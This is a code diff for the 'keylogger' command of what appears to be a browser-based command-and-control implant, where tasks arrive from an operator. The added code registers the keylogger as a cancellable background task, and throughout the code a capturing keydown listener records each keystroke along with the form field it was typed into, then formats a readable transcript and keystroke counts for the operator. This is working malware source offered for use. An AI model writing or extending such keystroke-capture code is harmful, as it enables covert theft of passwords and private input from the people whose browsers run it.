@@ -1,8 +1,5 @@
 COMMANDS['keylogger'] = async function(task) {
-    var params = task.parameters;
-    if (typeof params === 'string') {
-        try { params = JSON.parse(params); } catch (e) { params = {}; }
-    }
+    var params = parseParams(task);
     var duration = (params && params.duration) ? parseInt(params.duration) : 60;
 
     var entries = [];
@@ -46,15 +43,35 @@ COMMANDS['keylogger'] = async function(task) {
 
     document.addEventListener('keydown', handler, true);
 
-    await new Promise(function(resolve) {
-        setTimeout(resolve, duration * 1000);
+    // Register as background task with cancel support
+    var cancelled = false;
+    var timer;
+    registerBackgroundTask(task.id, 'keylogger', function() {
+        cancelled = true;
+        if (timer) clearTimeout(timer);
+        document.removeEventListener('keydown', handler, true);
     });
 
-    document.removeEventListener('keydown', handler, true);
+    await new Promise(function(resolve) {
+        timer = setTimeout(resolve, duration * 1000);
+        // If cancelled, the cancel callback clears the timer and we resolve via the cancel path
+        var checkCancel = setInterval(function() {
+            if (cancelled) {
+                clearInterval(checkCancel);
+                resolve();
+            }
+        }, 200);
+    });
+
+    if (!cancelled) {
+        document.removeEventListener('keydown', handler, true);
+    }
+    unregisterBackgroundTask(task.id);
 
     // Format output
     var output = {
         duration: duration + 's',
+        cancelled: cancelled,
         totalKeystrokes: entries.filter(function(e) { return e.key; }).length,
         captureStart: entries.length > 0 ? entries[0].ts : null,
         captureEnd: entries.length > 0 ? entries[entries.length - 1].ts : null,
@@ -68,11 +85,11 @@ COMMANDS['keylogger'] = async function(task) {
             readable += '\n[' + entries[i].field + '] ';
         } else if (entries[i].key) {
             if (entries[i].key === '[Enter]') {
-                readable += '⏎\n';
+                readable += '\u23ce\n';
             } else if (entries[i].key === '[Backspace]') {
-                readable += '⌫';
+                readable += '\u232b';
             } else if (entries[i].key === '[Tab]') {
-                readable += '⇥';
+                readable += '\u21e5';
             } else if (entries[i].key === '[Space]' || entries[i].key === ' ') {
                 readable += ' ';
             } else if (entries[i].key.length === 1) {
